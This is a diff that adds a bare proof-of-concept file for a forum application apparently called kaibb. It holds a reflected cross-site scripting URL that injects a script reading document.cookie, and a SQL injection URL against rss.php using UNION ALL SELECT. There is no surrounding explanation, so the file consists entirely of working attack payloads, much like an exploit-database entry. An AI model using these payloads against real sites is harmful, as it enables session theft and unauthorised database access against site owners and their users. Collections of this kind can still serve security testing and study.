@@ -1,0 +1,7 @@
+Cross-site scripting:
+
+http://www.example.com/kaibb/index.php?'</script><script>alert(document.cookie)</script>
+ 
+SQL-injection:
+ 
+http://www.example.com/kaibb/rss.php?forum=' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL AND 'a'='a
